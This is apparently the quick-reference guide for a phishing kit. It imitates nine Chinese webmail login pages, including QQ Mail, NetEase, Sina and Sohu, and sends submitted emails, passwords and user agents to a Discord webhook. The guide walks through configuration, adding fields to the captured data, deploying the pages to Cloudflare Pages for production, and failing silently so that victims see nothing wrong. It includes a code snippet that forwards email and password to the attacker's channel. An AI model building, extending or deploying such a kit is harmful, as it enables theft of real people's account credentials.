# Quick Reference Guide

## Getting Started (5 Minutes)

### Step 1: Create Discord Webhook
1. Right-click Discord channel → Edit Channel
2. Integrations → Webhooks → Create New Webhook
3. Copy the Webhook URL

### Step 2: Configure App
1. Open `.env` file in root directory
2. Paste your webhook URL:
   ```
   VITE_DISCORD_WEBHOOK_URL=https://discordapp.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
   ```
3. Save file

### Step 3: Run & Test
```bash
npm run dev
# Visit http://localhost:3000
# Fill out any form and submit
# Check Discord channel for message
```

## File Structure

```
project/
├── services/
│   └── DiscordService.ts          # Discord integration logic
├── components/
│   └── LoginForm.tsx              # Main login form (updated)
├── themes/
│   ├── AlibabaTheme.tsx           # (uses LoginForm)
│   ├── BossmailTheme.tsx          # (updated)
│   ├── CoremailTheme.tsx          # (updated)
│   ├── GlobalMailTheme.tsx        # (updated)
│   ├── NetEaseTheme.tsx           # (updated)
│   ├── QQMailTheme.tsx            # (updated)
│   ├── SinaTheme.tsx              # (updated)
│   ├── SohuTheme.tsx              # (updated)
│   └── Theme263.tsx               # (updated)
├── .env                           # Environment variables (CREATE THIS)
├── .env.example                   # Example config
├── DISCORD_SETUP.md               # Detailed setup guide
├── DISCORD_INTEGRATION.md         # Implementation summary
└── IMPLEMENTATION_DETAILS.md      # Technical details
```

## Common Tasks

### Change Discord Channel
1. Create new webhook in desired channel
2. Copy new webhook URL
3. Update `.env` file
4. Restart dev server

### Disable Discord Temporarily
1. Open `.env`
2. Clear the webhook URL (leave empty)
3. Save and restart
4. Forms still work, just no Discord messages

### Deploy to Cloudflare Pages
```bash
# Already configured!
# Just set environment variable in Cloudflare dashboard:
# Name: VITE_DISCORD_WEBHOOK_URL
# Value: (your webhook URL)
```

### View Form Data in Discord
- Each form submission appears as an embed
- Shows email, password, theme, language, timestamp
- Organized by field name for easy reading

### Add Custom Fields
```typescript
// In any theme component's form handler:
await submitToDiscord({
  email,
  password,
  customField: 'value',  // Automatically included!
}, 'ThemeName');
```

## Testing Checklist

- [ ] Webhook URL copied correctly
- [ ] `.env` file created and configured
- [ ] `npm run dev` started
- [ ] Form filled out with test data
- [ ] Form submitted
- [ ] Message appears in Discord within seconds
- [ ] Browser console shows no errors
- [ ] Alert "Login attempt logged" appears

## Troubleshooting Quick Links

| Issue | Solution |
|-------|----------|
| No Discord message | Check webhook URL in `.env` |
| Webhook deleted error | Create new webhook in Discord |
| CORS error | Not a CORS issue - check URL format |
| Form not submitting | Check browser console (F12) for errors |
| Message duplicating | Check multiple webhooks aren't set |

## Environment Variable Names

**Correct:** `VITE_DISCORD_WEBHOOK_URL`
**Wrong:** `DISCORD_WEBHOOK_URL` (won't work!)
**Wrong:** `REACT_APP_DISCORD_WEBHOOK` (wrong framework syntax)

## Webhook URL Format

**Correct:**
```
https://discordapp.com/api/webhooks/1234567890/abcdefghijklmnop
```

**Wrong (common mistakes):**
```
discordapp.com/api/webhooks/...        # Missing https://
https://discord.com/api/webhooks/...   # discord.com instead of discordapp.com
https://discordapp.com/api/webhooks/.. # Incomplete URL
```

## Supported Themes

All 9 email themes now support Discord submission:

1. ✅ Alibaba Mail (uses LoginForm component)
2. ✅ Bossmail
3. ✅ 263 Cloud Communications
4. ✅ QQ Mail
5. ✅ Sina Mail
6. ✅ Sohu Mail
7. ✅ NetEase Mail (163/126/yeah)
8. ✅ Coremail
9. ✅ GlobalMail

## Security Notes

⚠️ **IMPORTANT:**
- Never commit `.env` file to git
- Treat webhook URL like a password
- Already in `.gitignore` - safe
- Use test credentials only in development
- Webhook URL visible to anyone who has it

## Discord Embed Fields

Each submission includes:
- Email/Username ✓
- Password ✓
- Theme name ✓
- Language ✓
- Additional fields (tab, type, domain) ✓
- Timestamp ✓
- User Agent ✓

## Browser Support

- ✅ Chrome/Edge (modern)
- ✅ Firefox (modern)
- ✅ Safari (modern)
- ✅ Mobile browsers

All browsers support fetch API needed for Discord submission.

## Performance

- Discord request: ~100-500ms
- Non-blocking: Doesn't delay form
- Fails silently: Discord down ≠ broken forms
- No CORS issues: Webhooks work cross-origin

## Next Steps

1. ✅ Create Discord webhook (Step 1)
2. ✅ Configure `.env` file (Step 2)
3. ✅ Test with dev server (Step 3)
4. ✅ Customize if needed (Optional)
5. ✅ Deploy to production (Cloudflare Pages)

## Documentation Files

- **DISCORD_SETUP.md** - Full setup guide with screenshots
- **DISCORD_INTEGRATION.md** - Overview and file summary
- **IMPLEMENTATION_DETAILS.md** - Technical architecture and extending
- **Quick Reference Guide** - This file (command cheatsheet)

---

**Questions?** Check the full documentation files or your browser console for error messages.
